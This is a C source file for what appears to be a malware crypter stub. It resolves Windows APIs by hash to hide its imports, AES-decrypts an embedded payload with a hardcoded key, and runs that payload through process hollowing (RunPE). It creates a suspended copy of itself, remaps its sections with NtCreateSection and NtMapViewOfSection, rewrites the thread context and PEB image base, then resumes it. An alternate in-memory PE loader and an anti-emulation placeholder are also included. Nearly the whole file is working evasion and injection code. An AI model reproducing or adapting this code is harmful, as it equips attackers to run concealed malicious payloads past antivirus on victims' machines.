#include "main.h"

APIs		load_api(void)
{
	APIs	a;
	int		i;
	LPBYTE	pbKernel32;
	LPBYTE	pbNtdll;
	LPBYTE	pbAdvapi;
	WCHAR	wk32[] = { L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0'};
	WCHAR	wntdll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
	WCHAR	wadv32[] = { L'a', L'd', L'v', L'a', L'p', L'i', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };

	API		apis_krnl[] = 
	{
		{ 0x5C856C47, &a.CreateProcess },
		{ 0x649EB9C1, &a.GetThreadContext },
		{ 0xF7C7AE42, &a.ReadProcessMemory },
		{ 0x5688CBD8, &a.SetThreadContext },
		{ 0x09CE0D4A, &a.VirtualAlloc },
		//{ 0xE62E824D,  &a.VirtualAllocEx },
		//{ 0x4F58972E,  &a.WriteProcessMemory },
		//{ 0x3872BEB9,  &a.ResumeThread },
		{ 0xAB40BF8D, &a.TerminateProcess },
		{ 0x251097CC, &a.ExitProcess },
		{ 0xFC6B42F1, &a.GetModuleFileName },
		{ 0xD9B20494, &a.GetCommandLine },
		{ 0xB09315F4, &a.CloseHandle },
		{ 0x2E50340B, &a.IsWow64Process },
		{ 0xA1EFE929, &a.CreateFile },
		{ 0x095C03D0, &a.ReadFile },
		{ 0xA7FB4165, &a.GetFileSize },
		{ 0xCD53F5DD, &a.VirtualFree },
		{ 0xCB1508DC, &a.LoadLibraryW },
		{ 0x3FC1BD8D, &a.LoadLibraryA },
		{ 0x4552D021, &a.GetModuleHandle },
		{ 0xC97C1FFF, &a.GetProcAddress },
		{ 0xE058BB45, &a.WaitForSingleObject },
		{ 0x906A06B0, &a.CreateThread },
		{ 0x7714FA20, &a.ExitThread },
	};

	//API		apis_ntdll[] =
	//{
	//	{ 0x90483FF6,  &a.NtUnmapViewOfSection },
	//};

	API			apis_advapi[] = 
	{
		{ 0x5C969BF4, &a.CryptAcquireContext },
		{ 0xDF39A8EC, &a.CryptCreateHash },
		{ 0xC6E38110, &a.CryptHashData },
		{ 0xF627EB17, &a.CryptDeriveKey },
		{ 0x0A64C1E0, &a.CryptDestroyHash },
		{ 0x9C2D8FB5, &a.CryptDecrypt },
		{ 0xEDFA2583, &a.CryptDestroyKey },
		{ 0xA8403ACE, &a.CryptReleaseContext },
	};

	if (pbKernel32 = get_module_handle(wk32))
		for (i = 0; i < sizeof(apis_krnl) / sizeof(API); i++)
			*((DWORD_PTR*)(apis_krnl[i].lpApiFuncPtr)) = get_proc_address(pbKernel32, apis_krnl[i].dwApiHash);


	if (pbAdvapi = a.LoadLibrary(wadv32))
		for (i = 0; i < sizeof(apis_advapi) / sizeof(API); i++)
			*((DWORD_PTR*)(apis_advapi[i].lpApiFuncPtr)) = get_proc_address(pbAdvapi, apis_advapi[i].dwApiHash);


	//if (pbNtdll = get_module_handle(wntdll))
	//	for (i = 0; i < sizeof(apis_ntdll) / sizeof(API); i++)
	//		*((DWORD_PTR*)(apis_ntdll[i].lpApiFuncPtr)) = get_proc_address(pbNtdll, apis_ntdll[i].dwApiHash);

	return (a);
}

int			runpe(APIs a, void* f)
{
	unsigned int			has_failed;
	wchar_t					module_path[MAX_PATH];
	PROCESS_INFORMATION		ProcInfo;
	STARTUPINFO				StartInfo;
	CONTEXT					Context;
	DWORD_PTR				proc_image_base;
	PIMAGE_NT_HEADERS		pinh;
	PIMAGE_DOS_HEADER		pidh;
	PIMAGE_SECTION_HEADER	pish;
	DWORD_PTR				pImage_Page;
	DWORD_PTR				pMapImage;
	int						i;
	HANDLE					SectionHandle;
	LARGE_INTEGER			MaximumSize;
	SIZE_T					ViewSize;

	_memset(&ProcInfo, 0, sizeof(ProcInfo));
	_memset(&StartInfo, 0, sizeof(StartInfo));
	_memset(&MaximumSize, 0, sizeof(MaximumSize));

	ViewSize = 0;
	SectionHandle = 0;

	pidh = (PIMAGE_DOS_HEADER)f;
	pinh = (PIMAGE_NT_HEADERS)(((DWORD_PTR)f) + pidh->e_lfanew);
	pish = IMAGE_FIRST_SECTION(pinh);

	MaximumSize.LowPart = pinh->OptionalHeader.SizeOfImage;
	pImage_Page = pinh->OptionalHeader.ImageBase;
	pMapImage = 0;

	BOOL bMustRelocate = FALSE;
	BOOL bCanRelocate = !(pinh->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) && (pinh->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE);

	if (!a.GetModuleFileName(NULL, module_path, MAX_PATH - 1))
		return (E_ERROR);

	has_failed = TRUE;
	do
	{
		if (!a.CreateProcess(module_path, a.GetCommandLine(), 0, 0, 0, CREATE_NO_WINDOW | CREATE_SUSPENDED, 0, 0, &StartInfo, &ProcInfo))
			break;

		Context.ContextFlags = CONTEXT_FULL;
		if (!a.GetThreadContext(ProcInfo.hThread, &Context))
			break;
		
		if (!a.ReadProcessMemory(ProcInfo.hProcess, Context.Ebx + (sizeof(DWORD_PTR) * 2), &proc_image_base, sizeof(DWORD_PTR), 0))
			break;

		if (proc_image_base >= pinh->OptionalHeader.ImageBase && proc_image_base <= (pinh->OptionalHeader.ImageBase + pinh->OptionalHeader.SizeOfImage))
			if (mNtUnmapViewOfSection(ProcInfo.hProcess, proc_image_base))
				break;

		//if (!(pImage_Page = mVirtualAllocEx(ProcInfo.hProcess, pinh->OptionalHeader.ImageBase, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
		//	break;

		if (mNtCreateSection(&SectionHandle, SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL))
			break;

		if (mNtMapViewOfSection(SectionHandle, ProcInfo.hProcess, &pImage_Page, NULL, NULL, NULL, &ViewSize, 2, NULL, PAGE_EXECUTE_READWRITE))
		{
			if (bCanRelocate)
			{
				bMustRelocate = TRUE;
				pImage_Page = NULL;
				if (mNtMapViewOfSection(SectionHandle, ProcInfo.hProcess, &pImage_Page, NULL, NULL, NULL, &ViewSize, 2, NULL, PAGE_EXECUTE_READWRITE))
					break;
			}
			else
				break;
		}

		if (mNtMapViewOfSection(SectionHandle, INVALID_HANDLE_VALUE, &pMapImage, NULL, NULL, NULL, &ViewSize, 2, NULL, PAGE_EXECUTE_READWRITE))
			break;

		_memcpy(pMapImage, f, pinh->OptionalHeader.SizeOfHeaders);
		//if (!mWriteProcessMemory(ProcInfo.hProcess, pImage_Page, f, pinh->OptionalHeader.SizeOfHeaders, 0))
		//	break;

		for (i = 0; i < pinh->FileHeader.NumberOfSections; i++)
			_memcpy(pMapImage + pish[i].VirtualAddress, ((DWORD_PTR)f) + pish[i].PointerToRawData, pish[i].SizeOfRawData);
			//mWriteProcessMemory(ProcInfo.hProcess, pImage_Page + pish[i].VirtualAddress, ((DWORD_PTR)f) + pish[i].PointerToRawData, pish[i].SizeOfRawData, 0);

		if (bMustRelocate && pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
			&& pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
		{
			DWORD RelocDirSize = pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
			PIMAGE_BASE_RELOCATION pRel = (PIMAGE_BASE_RELOCATION)((ULONG)pMapImage + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

			while (RelocDirSize)
			{
				DWORD SizeOfBlock = pRel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION);
				PUSHORT pEntries = ((ULONG)pRel) + sizeof(IMAGE_BASE_RELOCATION);

				for (; SizeOfBlock; pEntries++, SizeOfBlock -= sizeof(USHORT))
				{
					if ((*pEntries >> 12) & IMAGE_REL_BASED_HIGHLOW)
					{
						PDWORD pFixup = ((ULONG)pMapImage) + pRel->VirtualAddress + (*pEntries & (USHORT)0xfff);
						*pFixup += (((ULONG)pMapImage) - pinh->OptionalHeader.ImageBase);
					}
				}
				RelocDirSize -= pRel->SizeOfBlock;
				pRel = (ULONG)pRel + pRel->SizeOfBlock;
			}
		}

		if (!mWriteProcessMemory(ProcInfo.hProcess, (LPVOID)(Context.Ebx + (sizeof(LPVOID) + sizeof(UINT))), &pImage_Page, sizeof(LPVOID), 0))
			break;

		Context.Eax = pImage_Page + pinh->OptionalHeader.AddressOfEntryPoint;
		if (!a.SetThreadContext(ProcInfo.hThread, &Context))
			break;

		if (!mResumeThread(ProcInfo.hThread))
			break;

		if (ProcInfo.hProcess)
			a.CloseHandle(ProcInfo.hProcess);
		if (ProcInfo.hThread)
			a.CloseHandle(ProcInfo.hThread);
		if (SectionHandle)
			a.CloseHandle(SectionHandle);
		if (pMapImage)
			mNtUnmapViewOfSection(INVALID_HANDLE_VALUE, pMapImage);

		has_failed = FALSE;

	} while (0);
	
	if (has_failed == TRUE)
	{
		if (ProcInfo.hProcess)
		{
			a.TerminateProcess(ProcInfo.hProcess, 0);
			a.CloseHandle(ProcInfo.hProcess);
		}
		if (ProcInfo.hThread)
			a.CloseHandle(ProcInfo.hThread);
		if (SectionHandle)
			a.CloseHandle(SectionHandle);
		if (pMapImage)
			mNtUnmapViewOfSection(INVALID_HANDLE_VALUE, pMapImage);

		return (E_ERROR);
	}
	return (E_SUCCESS);
}

int pe_load(void *f)
{
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)f;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((ULONG)f + pDos->e_lfanew);
	PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

	PIMAGE_IMPORT_DESCRIPTOR pImp = NULL;

	PVOID pMapping = NULL;
	HANDLE SectionHandle = NULL;
	LARGE_INTEGER MaximumSize;
	SIZE_T ViewSize = 0;
	NTSTATUS ns = 0;

	APIs a = load_api();

	ULONG i;
	BOOL bMustRelocate = FALSE;
	BOOL bCanRelocate = !(pNt->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) && (pNt->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE);

	mNtUnmapViewOfSection(INVALID_HANDLE_VALUE, (PVOID)a.GetModuleHandle(NULL));

	MaximumSize.LowPart = pNt->OptionalHeader.SizeOfImage;
	MaximumSize.HighPart = 0;
	ns = mNtCreateSection(&SectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (!NT_SUCCESS(ns))
		return (1);

	pMapping = pNt->OptionalHeader.ImageBase;

	ns = mNtMapViewOfSection(SectionHandle, INVALID_HANDLE_VALUE, &pMapping, 0, 0, NULL, &ViewSize, 2, NULL, PAGE_EXECUTE_READWRITE);
	if (ns == 0xC0000018 && (bCanRelocate)) // STATUS_CONFLICTING_ADDRESSES
		bMustRelocate = TRUE;
	else if (!NT_SUCCESS(ns))
	{
		a.CloseHandle(SectionHandle);
		return (1);
	}

	if (bMustRelocate)
	{
		pMapping = NULL;
		ns = mNtMapViewOfSection(SectionHandle, INVALID_HANDLE_VALUE, &pMapping, 0, 0, NULL, &ViewSize, 2, NULL, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(ns))
		{
			a.CloseHandle(SectionHandle);
			return (1);
		}
	}

	_memcpy(pMapping, f, pNt->OptionalHeader.SizeOfHeaders);
	for (i = 0; i < pNt->FileHeader.NumberOfSections; i++)
		_memcpy((ULONG)pMapping + pSec[i].VirtualAddress, (ULONG)f + pSec[i].PointerToRawData, pSec[i].SizeOfRawData);

	if (bMustRelocate && pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
		&& pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
	{
		DWORD RelocDirSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
		PIMAGE_BASE_RELOCATION pRel = (PIMAGE_BASE_RELOCATION)((ULONG)pMapping + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

		while (RelocDirSize)
		{
			DWORD SizeOfBlock = pRel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION);
			PUSHORT pEntries = ((ULONG)pRel) + sizeof(IMAGE_BASE_RELOCATION);

			for (; SizeOfBlock; pEntries++, SizeOfBlock -= sizeof(USHORT))
			{
				if ((*pEntries >> 12) & IMAGE_REL_BASED_HIGHLOW)
				{
					PDWORD pFixup = ((ULONG)pMapping) + pRel->VirtualAddress + (*pEntries & (USHORT)0xfff);
					*pFixup += (((ULONG)pMapping) - pNt->OptionalHeader.ImageBase);
				}
			}
			RelocDirSize -= pRel->SizeOfBlock;
			pRel = (ULONG)pRel + pRel->SizeOfBlock;
		}
	}

	for (i = 0,
		pImp = (PIMAGE_IMPORT_DESCRIPTOR)((ULONG)pMapping + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
		pImp->Name;
		pImp++)
	{
		PCHAR Name = (ULONG)pMapping + pImp->Name;
		PIMAGE_THUNK_DATA pThk = (ULONG)pMapping + (pImp->OriginalFirstThunk ? pImp->OriginalFirstThunk : pImp->FirstThunk);
		PIMAGE_THUNK_DATA pThkUp = (ULONG)pMapping + (pImp->FirstThunk);

		for (; *(PDWORD)pThk; pThk++, pThkUp++)
			if (IMAGE_SNAP_BY_ORDINAL(pThk->u1.Ordinal))
				pThkUp->u1.Function = (DWORD)a.GetProcAddress(a.LoadLibraryA(Name), IMAGE_ORDINAL(pThk->u1.Ordinal));
			else
				pThkUp->u1.Function = (DWORD)a.GetProcAddress(a.LoadLibraryA(Name),
				((PIMAGE_IMPORT_BY_NAME)((ULONG)pMapping + pThk->u1.AddressOfData))
					->Name);
	}

	PPEB peb = __readfsdword(0x30);

	peb->Reserved3[1] = pMapping;
	((PLDR_DATA_TABLE_ENTRY)peb->Ldr->Reserved2[1])->DllBase = pMapping;

	LPTHREAD_START_ROUTINE entry = (LPTHREAD_START_ROUTINE)(pNt->OptionalHeader.AddressOfEntryPoint + (ULONG)pMapping);

	a.CreateThread(0, pNt->OptionalHeader.SizeOfStackCommit, entry, NULL, 0, NULL);

	return (0);
}

void *_Crypt_DecryptData(void *vData, DWORD *dwDataLen, void *vCryptKey)
{
	HCRYPTPROV prov;
	HCRYPTHASH hash;
	HCRYPTKEY key;
	void *buf;
	APIs a;

	a = load_api();

	if (!a.CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
		a.ExitProcess(0);

	if (!a.CryptCreateHash(prov, CALG_MD5, 0, 0, &hash))
		a.ExitProcess(0);

	if (!a.CryptHashData(hash, vCryptKey, 16, CRYPT_USERDATA))
		a.ExitProcess(0);

	if (!a.CryptDeriveKey(prov, CALG_AES_256, hash, CRYPT_EXPORTABLE, &key))
		a.ExitProcess(0);

	a.CryptDestroyHash(hash);

	if (!(buf = a.VirtualAlloc(NULL, *dwDataLen + 1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
		a.ExitProcess(0);

	_memcpy(buf, vData, *dwDataLen);

	if (!a.CryptDecrypt(key, 0, TRUE, 0, buf, dwDataLen))
		a.ExitProcess(0);

	a.CryptDestroyKey(key);
	a.CryptReleaseContext(prov, 0);
	
	return (buf);
}

void		anti_emulation(void)
{
	// TODO: Efficient WinAPI-less Anti Emulator
}

int			shellcode_main(LPVOID lpEncryptedPayload, ULONG dwPayloadSize)
{
	APIs		a;
	uint32_t	key[4] = {0xDEADBEEF, 0xDEADBEEF, 0xDEADBEEF, 0xDEADBEEF};

	anti_emulation();
	a = load_api();

	//pe_load(_Crypt_DecryptData(lpEncryptedPayload, &dwPayloadSize, &key[0]));
	runpe(a, _Crypt_DecryptData(lpEncryptedPayload, &dwPayloadSize, &key[0]));

	//a.ExitThread(0);
	a.ExitProcess(0);
	return (E_SUCCESS);
}
